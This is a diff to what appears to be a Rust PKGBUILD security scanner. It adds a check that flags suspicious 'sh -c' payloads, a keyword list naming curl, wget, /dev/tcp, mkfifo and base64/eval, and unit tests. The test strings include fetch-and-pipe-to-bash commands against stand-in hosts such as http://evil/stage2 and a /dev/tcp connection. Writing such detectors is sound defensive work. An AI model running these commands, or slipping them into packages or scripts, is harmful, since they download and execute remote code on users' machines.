@@ -271,6 +271,103 @@ pub(crate) fn python_inline_exec(source: &str) -> Option<usize> {
     None
 }
 
+/// AST: sh/bash/dash/ash/zsh -c 'payload' with suspicious content.
+/// Catches obfuscation that other checks miss when the work is inside -c.
+pub(crate) fn shell_c_exec(source: &str) -> Option<usize> {
+    let tree = parse(source)?;
+    let src = source.as_bytes();
+    let mut commands = Vec::new();
+    find_descendants(tree.root_node(), "command", &mut commands);
+
+    for cmd in commands {
+        let Some(name) = command_name_of(cmd, src) else { continue };
+        if !SHELL_NAMES.contains(&basename(&name)) {
+            continue;
+        }
+
+        let mut cursor = cmd.walk();
+        let children: Vec<Node> = cmd.children(&mut cursor).collect();
+
+        let mut saw_c = false;
+        for child in &children {
+            // plain "-c" or combined short flags containing c (-ec, -ce, ...)
+            if child.kind() == "word" {
+                if let Ok(text) = child.utf8_text(src) {
+                    let t = text.trim();
+                    if t == "-c"
+                        || (t.starts_with('-')
+                            && !t.starts_with("--")
+                            && t.contains('c')
+                            && t.chars().all(|c| c == '-' || c.is_ascii_alphabetic()))
+                    {
+                        saw_c = true;
+                        continue;
+                    }
+                }
+            }
+
+            if !saw_c {
+                continue;
+            }
+
+            // first non-flag arg after -c is the script body
+            if matches!(child.kind(), "string" | "raw_string" | "word" | "concatenation") {
+                if let Some(text) = resolve_word(*child, src) {
+                    if is_suspicious_shell_c_payload(&text) {
+                        return Some(line_of(cmd));
+                    }
+                }
+            }
+            break;
+        }
+    }
+    None
+}
+
+/// Heuristic for `sh -c '...'` payload. Kept strict to limit FP on
+/// simple `sh -c "make install"` / `bash -c "cmake --build ."`.
+fn is_suspicious_shell_c_payload(text: &str) -> bool {
+    let lower = text.to_lowercase();
+    let len = lower.len();
+
+    if lower.contains("base64")
+        || lower.contains("eval ")
+        || lower.contains("eval\"")
+        || lower.contains("eval'")
+        || lower.contains("curl ")
+        || lower.contains("wget ")
+        || lower.contains("/dev/tcp")
+        || lower.contains("mkfifo")
+        || lower.contains("bash -i")
+        || lower.contains("sh -i")
+        || lower.contains("python -c")
+        || lower.contains("python3 -c")
+        || lower.contains("perl -e")
+        || lower.contains("ruby -e")
+        || lower.contains("openssl enc")
+        || lower.contains("xxd -r")
+        || lower.contains("cp /bin/sh")
+        || lower.contains("chmod +x")
+        || lower.contains("chmod 7")
+    {
+        return true;
+    }
+
+    // very long one-liners are almost never legitimate in PKGBUILDs
+    if len > 160 {
+        return true;
+    }
+
+    // multiple staging separators in a moderately long string
+    let staging_markers = ["&&", ";", "|", "`", "$("];
+    let marker_count = staging_markers.iter().filter(|m| lower.contains(*m)).count();
+    if len > 80 && marker_count >= 3 {
+        return true;
+    }
+
+    false
+}
+
 const DEP_ARRAY_NAMES: &[&str] = &["depends", "makedepends", "checkdepends"];
 
 /// Static depends/makedepends/checkdepends (+ arch suffix) for pacman -S.
@@ -432,6 +529,74 @@ mod ast_tests {
     }
 
     #[test]
+    fn shell_c_exec_catches_common_obfuscation() {
+        assert_eq!(
+            shell_c_exec(r#"sh -c 'curl -sSL http://evil/x | bash'"#),
+            Some(1)
+        );
+        assert_eq!(
+            shell_c_exec(r#"bash -c "eval \"\$(base64 -d <<< '...')\"""#),
+            Some(1)
+        );
+        assert_eq!(
+            shell_c_exec("dash -c 'wget -qO- http://x | sh'"),
+            Some(1)
+        );
+        assert_eq!(
+            shell_c_exec(r#"/bin/bash -c 'python3 -c "import os; os.system(\"id\")"'"#),
+            Some(1)
+        );
+        assert_eq!(
+            shell_c_exec("sh -c '/dev/tcp/1.2.3.4/443'"),
+            Some(1)
+        );
+    }
+
+    #[test]
+    fn shell_c_exec_catches_long_or_heavy_staging() {
+        let long = "sh -c '".to_string() + &"a".repeat(170) + "'";
+        assert_eq!(shell_c_exec(&long), Some(1));
+
+        assert_eq!(
+            shell_c_exec(r#"bash -c 'x=1; y=2; z=3; eval "$x$y$z"'"#),
+            Some(1)
+        );
+    }
+
+    #[test]
+    fn shell_c_exec_ignores_benign() {
+        assert_eq!(shell_c_exec(r#"sh -c "make install""#), None);
+        assert_eq!(shell_c_exec(r#"bash -c 'cmake --build .'"#), None);
+        assert_eq!(shell_c_exec("sh -c 'ninja -C build'"), None);
+        assert_eq!(shell_c_exec("# sh -c 'curl evil | bash'"), None);
+        assert_eq!(shell_c_exec("echo 'sh -c evil'"), None);
+    }
+
+    #[test]
+    fn shell_c_exec_handles_combined_flags_and_concat() {
+        assert_eq!(
+            shell_c_exec(r#"sh -ec 'curl -s http://x | sh'"#),
+            Some(1)
+        );
+        // concatenation on the shell name itself
+        assert_eq!(
+            shell_c_exec(r#"s""h -c 'wget -qO- http://x | bash'"#),
+            Some(1)
+        );
+    }
+
+    #[test]
+    fn shell_c_exec_inside_function_is_still_caught() {
+        let src = r#"
+build() {
+  cd "$srcdir"
+  sh -c 'curl -sSL http://evil/stage2 | bash'
+}
+"#;
+        assert_eq!(shell_c_exec(src), Some(4));
+    }
+
+    #[test]
     fn top_level_command_substitution_caught_and_not_false_positive() {
         // the real repro: backticks left over from a markdown code span,
         // pasted straight into pkgdesc.
@@ -497,6 +662,7 @@ package() {
         assert_eq!(curl_pipe_shell(clean), None);
         assert_eq!(eval_remote_exec(clean), None);
         assert_eq!(python_inline_exec(clean), None);
+        assert_eq!(shell_c_exec(clean), None);
     }
 
     #[test]
